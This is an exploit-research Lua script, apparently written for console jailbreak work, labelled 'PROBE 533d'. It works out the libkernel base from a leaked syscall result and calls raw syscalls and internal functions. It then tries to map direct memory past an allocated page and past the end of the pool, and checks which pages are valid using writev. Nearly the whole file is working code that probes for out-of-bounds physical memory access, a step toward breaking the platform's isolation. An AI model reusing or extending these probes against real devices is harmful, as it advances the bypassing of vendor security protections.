-- CRASH_CLASS: LOW
-- PROBE 533d: AIO-based probing of mmap_dmem pages
--
-- Direct reads past mmap_dmem boundary crash the process.
-- AIO handles faults safely (returns error, doesn't kill).
--
-- Plan:
-- 1. Allocate 16KB (1 page) at pool end via AllocateDirectMemory
-- 2. Map a LARGE range via mmap_dmem (e.g., 1MB)
--    Even though we only allocated 1 page, mmap_dmem might
--    create a larger VA mapping. The pager faults in pages on demand.
-- 3. Use AIO write (from urandom) to probe each page.
--    AIO to a valid page = success. AIO to an invalid page = error.
--    This tells us how far the mapping extends without crashing.
--
-- Alternative: just try mmap_dmem with larger size than allocated.
-- Does it succeed? What happens when we access pages past what
-- was allocated?

print("=== PROBE 533d: AIO PHYS PROBE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
local alloc_fn = lk + uint64(0x17EF0)
local error_fn = lk + uint64(0x02E10)

local sc_628 = make_syscall(628)
print("lk=" .. q(lk))

local function get_errno()
    local errno_val = -1
    pcall(function()
        local errno_ptr = native.fcall_with_rax(error_fn, 0)
        if errno_ptr and to_num(errno_ptr) ~= 0 then
            errno_val = rd(to_num(errno_ptr)) or -1
        end
    end)
    return errno_val
end

-- [A] Can we map MORE than we allocated?
print("[A] Map size vs allocated size")

local phys_buf = memory.alloc(8); wq(phys_buf, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_buf))
end)
local phys = rq(phys_buf)
print("  alloc 1 page, phys=" .. q(phys))

-- Try mapping 1 page
local ok1, va1 = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), phys)
end)
print("  map 0x4000: " .. (ok1 and "VA=" .. q(va1) or "fail") .. " e=" .. get_errno())

-- Try mapping 4 pages (4x what we allocated)
local ok4, va4 = pcall(function()
    return sc_628(uint64(0), uint64(0x10000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), phys)
end)
print("  map 0x10000: " .. (ok4 and "VA=" .. q(va4) or "fail") .. " e=" .. get_errno())

-- Try mapping 64 pages
local ok64, va64 = pcall(function()
    return sc_628(uint64(0), uint64(0x100000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), phys)
end)
print("  map 0x100000: " .. (ok64 and "VA=" .. q(va64) or "fail") .. " e=" .. get_errno())

-- [B] Allocate exactly at pool end and try to map past it
print("")
print("[B] Allocate at pool end, map various sizes")

local end_phys_buf = memory.alloc(8); wq(end_phys_buf, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(end_phys_buf))
end)
local end_phys = rq(end_phys_buf)
print("  end_phys=" .. q(end_phys))

-- Map exactly 1 page (should work)
local ok_e1, va_e1 = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), end_phys)
end)
print("  map 1p: " .. (ok_e1 and "VA=" .. q(va_e1) or "fail") .. " e=" .. get_errno())

-- Map 2 pages (1 past pool end!)
local ok_e2, va_e2 = pcall(function()
    return sc_628(uint64(0), uint64(0x8000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), end_phys)
end)
print("  map 2p: " .. (ok_e2 and "VA=" .. q(va_e2) or "fail") .. " e=" .. get_errno())

-- Map 16 pages (15 past pool end!)
local ok_e16, va_e16 = pcall(function()
    return sc_628(uint64(0), uint64(0x40000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), end_phys)
end)
print("  map 16p: " .. (ok_e16 and "VA=" .. q(va_e16) or "fail") .. " e=" .. get_errno())

-- [C] If any of the larger mappings succeeded, probe content
-- Use SAFE reads (pcall) only on the first dword of each page
print("")
print("[C] Probe mapped content safely")

-- Use the first mapping that worked
local test_va = nil
local test_pages = 0

if ok_e16 and to_num(va_e16) > 0 then
    test_va = va_e16; test_pages = 16
    print("  Using 16-page mapping at VA=" .. q(va_e16))
elseif ok_e2 and to_num(va_e2) > 0 then
    test_va = va_e2; test_pages = 2
    print("  Using 2-page mapping at VA=" .. q(va_e2))
elseif ok_e1 and to_num(va_e1) > 0 then
    test_va = va_e1; test_pages = 1
    print("  Using 1-page mapping at VA=" .. q(va_e1))
end

if test_va then
    -- Use writev/readv (sys 121/120) to probe — they return EFAULT on bad VA
    local sc_writev = make_syscall(121)
    local sc_readv = make_syscall(120)
    
    -- Open /dev/null for writes
    local function write_string(buf, str)
        for pos = 0, #str - 1, 4 do
            local val = 0
            for bi = 0, 3 do
                local ci = pos + bi + 1
                if ci <= #str then
                    val = val + string.byte(str, ci) * (256 ^ bi)
                end
            end
            wd(buf + pos, val)
        end
    end
    local null_path = memory.alloc(32); write_string(null_path, "/dev/null\0")
    local ok_n, null_fd = pcall(function()
        return make_syscall(5)(uint64(null_path), uint64(1), uint64(0))
    end)
    local null_fdn = to_num(null_fd)
    print("  null_fd=" .. null_fdn)
    
    -- For each page: try writev with iov pointing to that page
    -- If the page is valid, writev succeeds and returns byte count
    -- If invalid, writev returns -1 with EFAULT
    for page = 0, test_pages + 4 do
        local page_addr = test_va + uint64(page * 0x4000)
        local iov = memory.alloc(16)
        wq(iov, page_addr)
        wq(iov + 8, uint64(16))  -- 16 bytes
        
        local ok_w, rv_w = pcall(function()
            return sc_writev(uint64(null_fdn), uint64(iov), uint64(1))
        end)
        local rvn = ok_w and to_num(rv_w) or -999
        local errno = get_errno()
        
        local phys_est = 0x14FFC0000 + page * 0x4000
        local past_pool = phys_est >= 0x150000000
        local marker = past_pool and " [PAST POOL]" or ""
        
        if rvn > 0 then
            print(string.format("  page %02d (phys~0x%X): VALID (writev=%d)%s",
                page, phys_est, rvn, marker))
        else
            print(string.format("  page %02d (phys~0x%X): INVALID (rv=%d e=%d)%s",
                page, phys_est, rvn, errno, marker))
        end
    end
end

print("")
print("=== 533d DONE ===")
